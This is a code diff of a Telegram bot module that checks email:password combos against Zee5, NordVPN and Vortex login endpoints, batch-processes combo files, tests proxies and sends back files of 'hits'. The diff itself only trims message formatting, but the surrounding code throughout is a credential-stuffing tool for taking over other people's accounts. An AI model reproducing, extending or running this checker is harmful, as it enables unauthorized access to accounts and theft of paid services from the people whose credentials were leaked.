@@ -44,7 +44,7 @@ async def Devsexpo(event):
     )
     pablo = await event.get_reply_message()
     if pablo == None:
-        await event.reply('Reply To File')
+        await ok.edit('Reply To File')
         return
     escobar = await tbot.download_media(pablo.media, temp)
     cmd = f"python3 -m PyProxyToolkit.Console -i {escobar} -o goood.txt -t 80 -x 20 -s httpbinStrategy"
@@ -143,24 +143,16 @@ async def Devsexpo(event):
             f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
         ).json()
         beautifuln = f"""
-💖 **Checked Zee5 Account**
+**Checked Zee5 Account**
 **Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is Invalid. 😔
-
-🔱 **Checked By:-** {event.sender.first_name}
+**Response:-** Invalid
 """
 
         beautiful = f"""
-💖 **Checked Zee5 Account**
+**Checked Zee5 Account**
 **Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is valid.😀
+**Response:-** Valid Account
 **Login Here**: www.zee5.com
-
-🔱 **Checked By:-** {event.sender.first_name}
 """
         if meke.get("token"):
             await event.reply(beautiful)
@@ -218,7 +210,7 @@ async def Devsexpo(event):
         await tbot.send_file(
             event.chat_id,
             "hits.txt",
-            caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`",
+            caption=f"**!NORD HITS!** \n**Hits :** `{hits}` \n**Bad :** `{bads}`",
         )
         os.remove("hits.txt")
     else:
@@ -240,24 +232,16 @@ async def Devsexpo(event):
             json=sedlyf,
         ).json()
         beautifuln = f"""
-💖 **Checked Nord Account**
+**Checked Nord Account**
 **Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is Invalid. 😔
-
-🔱 **Checked By:-** {event.sender.first_name}
+**Response:-** Invalid
 """
 
         beautiful = f"""
-💖 **Checked Nord Account**
+**Checked Nord Account**
 **Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is valid.😀
+**Response:-** Valid Account
 **Login Here**: www.nordvpn.com
-
-🔱 **Checked By:-** {event.sender.first_name}
 """
         if meke.get("token"):
             await event.reply(beautiful)
@@ -333,24 +317,16 @@ async def vortex(event):
             url="https://vortex-api.gg/login", headers=data2, json=sedlyf
         ).json()
         beautifuln = f"""
-💖 **Checked Vortex Account**
+**Checked Vortex Account**
 **Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is Invalid. 😔
-
-🔱 **Checked By:-** {event.sender.first_name}
+**Response:-** Invalid
 """
 
         beautiful = f"""
-💖 **Checked Vortex Account**
+**Checked Vortex Account**
 **Combo:** {email}:{password}
-**Email:** {email}
-**Password:-** {password}
-**Response:-** This Account Is valid.😀
+**Response:-** Valid Account
 **Login Here**: www.vortex.gg
-
-🔱 **Checked By:-** {event.sender.first_name}
 """
         if meke.get("token"):
             await event.reply(beautiful)
@@ -362,12 +338,12 @@ file_help = file_help.replace(".py", "")
 file_helpo = file_help.replace("_", " ")
 
 __help__ = """
-- /zee5 <email:password> - Checks One Account
+- /zee5 <email:password> - Checks Zee5 
 - /zee5 combo - Reply To Combos File And Limit is 20.
 - /nord <email:password> - Checks One Account
 - /nord combo - Reply To Combos File And Limit is 20.
 - /vortex <email:password> - Checks One Account
 - /vortex combo - Reply To Combos File And Limit is 20.
-- /proxy - Reply To Proxy File Only, Check Your Proxies
+- /proxy - Reply To Proxy File Only, Check Your Proxies.
 """
 CMD_HELP.update({file_helpo: [file_helpo, __help__]})
